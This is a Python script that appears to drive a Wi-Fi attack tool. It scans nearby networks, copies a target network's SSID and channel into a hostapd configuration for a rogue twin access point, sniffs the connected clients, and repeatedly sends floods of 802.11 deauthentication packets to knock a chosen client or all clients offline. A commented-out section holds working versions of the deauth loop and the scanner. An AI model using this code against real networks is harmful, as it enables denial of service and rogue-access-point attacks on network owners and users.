#!/usr/bin/env python
import os
import sys
# import codecs
# import time
from colorama import Fore, Style, Back
# from scapy.all import sniff,sendp
# from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq , Dot11ProbeResp, Dot11Deauth, RadioTap
import logging

import fileinput
import signal
import colorama
from sys import platform
import threading
import argparse
from multiprocessing import Process

# import functions
from configs.config import setMonitorMode,updateHostAP,setManagerMode
from scanning.sniffing import sniffClients,scanNetworks
from spoofing.spoofing import setTarget

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# def sniffClients(wlan, BSSID):
#     global a
#     a = BSSID
#     interupted = False
#     try:
#         sniff(iface=wlan, prn=getClients, stop_filter=interupted)
#         while True:
#             time.sleep(1)
#     except KeyboardInterrupt:
#         interupted = True

# def getClients(pkt):
#     # print(a)
#     global voc
#     voc = {}  # vocabulary for all the pkt info
#     #voc[str(a)] = str(a)
#     bssid = pkt[Dot11].addr3
#     target_bssid = a
#     if target_bssid == bssid and not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeReq) and not pkt.haslayer(Dot11ProbeResp):
#         if str(pkt.summary()) not in voc:
#             print(pkt.summary())
#         voc[str(pkt.summary())] = True

# def DeAuthLoop(interface, brdMac, BSSID, numOfPack):
#     for i in range(0, numOfPack):
#         # This creates a Dot11Deauth packet that will be used to kick everyone out of the target network
#         # Addr1 is the broadcast addr
#         # Addr2 is the target addr
#         # Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network
#         pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
#         sendp(pkt, iface=interface, count=100000000,
#               inter=.001)  # Send deauth packet

# def setMonitorMode(wlan):
#     os.system("sudo ip link set " + wlan + " down")
#     os.system("sudo iw " + wlan + " set type monitor")
#     os.system("sudo ip link set " + wlan + " up")

# def scanNetworks(interface):
#     print("Press Ctrl-C to finish scanning for networks")
#     # we arrange all of the networks we have found in known so that we will not print the network information twice on the terminal.
#     known = {}

#     def callback(frame):
#         if frame.haslayer(Dot11):
#             if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):

#                 source = frame[Dot11].addr2
#                 if source not in known:  # if the network we found is not in 'known'
#                     ssid = frame[Dot11Elt][0].info  # save the ssid
#                     # save the channel of the network
#                     channel = frame[Dot11Elt][2].info
#                     # transfer it to hex numbers.
#                     print(channel)
#                     channel = int(codecs.getencoder('hex')(channel)[0], 16)
#                     # print the network information.
#                     print("SSID: '{}', BSSID: {}, channel: {}".format(
#                         ssid, source, channel))
#                     # add the network to 'known'
#                     known[source] = (ssid, channel)

#     sniff(iface=interface, prn=callback, store=0)

#     return known

# def updateHostAP(known,BSSID):
#     # changing hostapd.conf channel to the victim's wifi channel.
#     filename = "./configs/hostapd.conf"
#     text = str("#Set wifi interface" + "\n" + "interface=wlan0" + "\n" + "#Set network name" + "\n" + "ssid=" +
#                str(known[BSSID][0]) + "\n" + "#Set channel" + "\n" + "channel=" + str(
#         known[BSSID][1]) + "\n" + "#Set driver" + "\n" + "driver=nl80211")
#     f = open(filename, 'w')
#     f.close()
#     f = open(filename, 'w')
#     f.write(text)
#     f.close()

# def setTarget(brdMac,interface,BSSID):

#     numOfPack = int(input("how many packets do u wish to send? "))
#     # infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
#     DeAuthLoop(interface, brdMac, BSSID, numOfPack)

#     return brdMac


# def setManagerMode(wlan):
#     os.system("sudo ip link set " + wlan + " down")
#     os.system("sudo iw wlan0 set type managed")
#     os.system("sudo ip link set " + wlan + " up")


def attack():
    interface = wlan = input("\nEnter full interface name to set to Monitor Mode: \n "
                             "(The full address can be found via the terminal... run command 'pwconfig' and find the desired device) \n \n ")

    setMonitorMode(wlan)

    print("\nIn order to change back card into regular wifi-mode run the following command after you are done: \n"
          "service NetworkManager restart\n")

    try:
        known = scanNetworks(interface)

    except KeyboardInterrupt:
        print("Press Ctrl-C to finish scanning for networks")
        pass

    print("Dauth stage: ")
    # Let the user input the MAC address of the router
    BSSID = input('Please enter the BSSID/MAC address of the AP: ')

    print('Changing ' + wlan + ' to channel ' + str(known[BSSID][1]))
    os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))

    updateHostAP(known,BSSID)

    sniffClients(wlan, BSSID)

    brdMac = input(
        'Please enter the BSSID/MAC address of the client you wish to attack: ')

    print('Sending deauth packets now, press ctrl+c to end the attack')
    print('' * 2)

    setTarget(brdMac,interface,BSSID)

    while True:
        ans = input("DONE! do you want to keep attacking? (n/y): ")
        if(ans == 'y'):
            setTarget(brdMac,interface,BSSID)
        else:
            print("finishing attack")
            ans2 = input(
                "do you wish to turn your interface to managed mode again? (y/n):  ")
            if(ans2 == 'y'):
                setManagerMode(wlan)
                break
            else:
                break


if __name__ == "__main__":
    attack()
